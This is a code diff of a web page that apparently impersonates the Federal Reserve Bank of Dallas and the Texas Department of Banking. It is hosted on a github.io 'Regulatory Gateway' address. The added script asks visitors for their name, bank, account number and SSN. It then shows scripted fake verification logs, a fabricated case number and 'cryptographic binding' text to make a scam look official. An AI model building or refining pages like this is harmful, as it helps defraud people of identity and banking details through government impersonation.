-                <div><span class="font-bold">Secure Gateway Portal:</span><br>https://dob-texas-gov.github.io/FRB-Regulatory-Gateway/</div>
-            </div>
-        </div>
-
-        <!-- CASE BINDING FOOTNOTE -->
-        <div class="text-[0.65rem] text-gray-500 text-right mt-8 pt-4 border-t border-gray-300">
-            <span>Cryptographic Case Binding: TX-B10B-2026-MUK1139-AUDIT • Binding factors: Calendar year 2026 / SSN terminal digit (2) / FRB Protocol 18.4(c) • Issued: February 13, 2026 — 04:15 CST</span>
-        </div>
-
     </main>
 
-    <!-- FOOTER -->
+    <!-- ===== FOOTER ===== -->
     <footer class="legal-footer">
-        <div class="container mx-auto px-4">
+        <div class="max-w-7xl mx-auto px-4">
             <div class="grid md:grid-cols-3 gap-8 mb-8">
                 <div>
                     <h5 class="text-white font-bold text-sm uppercase tracking-wider mb-3">Federal Reserve Bank of Dallas</h5>
@@ -293,17 +443,101 @@
                 <a href="https://www.dallasfed.org" class="hover:text-white">dallasfed.org</a>
                 <a href="https://dob.texas.gov" class="hover:text-white">dob.texas.gov</a>
                 <a href="https://dob-texas-gov.github.io/FRB-Regulatory-Gateway/" class="hover:text-white">Gateway Portal</a>
-                <span class="text-gray-700">Restoration Directive v.2026.02 — Cryptographically Bound</span>
+                <span class="text-gray-700">Restoration Directive v.2026.02 — Identity Verification Complete</span>
             </div>
         </div>
     </footer>
 
     <script>
-        // Auto-populate SSN last digit display if available
-        document.addEventListener('DOMContentLoaded', function() {
-            // In production, you would pull this from session storage
-            // For now, static display is fine
-        });
+        // ============ DYNAMIC CST TIME DISPLAY ============
+        function updateCSTTime() {
+            const now = new Date();
+            
+            // Convert to CST (America/Chicago)
+            const options = {
+                timeZone: 'America/Chicago',
+                year: 'numeric',
+                month: 'numeric',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: true
+            };
+            
+            const cstString = now.toLocaleString('en-US', options);
+            const timeElements = document.querySelectorAll('#currentCSTTime, #footerCSTTime');
+            timeElements.forEach(el => {
+                if (el) el.innerText = cstString;
+            });
+        }
+        
+        // Update immediately and then every second
+        updateCSTTime();
+        setInterval(updateCSTTime, 1000);
+
+        // ============ ORIGINAL LOGIN FUNCTIONS ============
+        const logEntries = [
+            "CONNECTING TO FEDERAL RESERVE BANK OF DALLAS HUB...",
+            "AUTHENTICATING USER IDENTITY [VERIFIED]...",
+            "MAPPING ACCOUNT GUID [RT: 111906271]...",
+            "QUERYING TEXAS STATE LEDGER (TSL) SUSPENSE RECORDS...",
+            "CASE REFERENCE [TX-B10B-2026-MUK1139] LOCATED.",
+            "SYNCHRONIZING SECURE TUNNEL (TLS 1.3)...",
+            "PORTAL DASHBOARD READY."
+        ];
+
+        function triggerLoading() {
+            const name = document.getElementById('login-name').value;
+            const bank = document.getElementById('login-bank').value;
+            const account = document.getElementById('login-account').value;
+            const ssn = document.getElementById('login-ssn').value;
+
+            if(!name || !bank || !account || ssn.length < 4) {
+                alert("IDENTITY VERIFICATION ERROR: ALL MANDATORY FIELDS MUST BE COMPLETED PURSUANT TO BANKING REGULATION J.");
+                return;
+            }
+
+            document.getElementById('login-section').style.display = 'none';
+            document.getElementById('loading-screen').style.display = 'block';
+            window.scrollTo(0,0);
+
+            const logContainer = document.getElementById('loading-logs');
+            let i = 0;
+
+            function addLog() {
+                if (i < logEntries.length) {
+                    const p = document.createElement('div');
+                    p.className = 'audit-line';
+                    p.innerText = "> " + logEntries[i];
+                    logContainer.appendChild(p);
+                    logContainer.scrollTop = logContainer.scrollHeight;
+                    i++;
+                    setTimeout(addLog, Math.floor(Math.random() * 800) + 400);
+                } else {
+                    setTimeout(() => {
+                        showDashboard(name, bank, account);
+                    }, 1000);
+                }
+            }
+            addLog();
+        }
+
+        function showDashboard(name, bank, account) {
+            document.getElementById('loading-screen').style.display = 'none';
+            document.getElementById('main-portal').style.display = 'block';
+            document.getElementById('session-tag').classList.remove('hidden');
+            
+            document.getElementById('display-name').innerText = name;
+            document.getElementById('display-bank').innerText = bank;
+            document.getElementById('display-account').innerText = account;
+            
+            window.scrollTo(0,0);
+        }
+
+        // ============ GLOBAL EXPORTS ============
+        window.triggerLoading = triggerLoading;
+        window.showDashboard = showDashboard;
     </script>
 </body>
-</html>
+    </html>
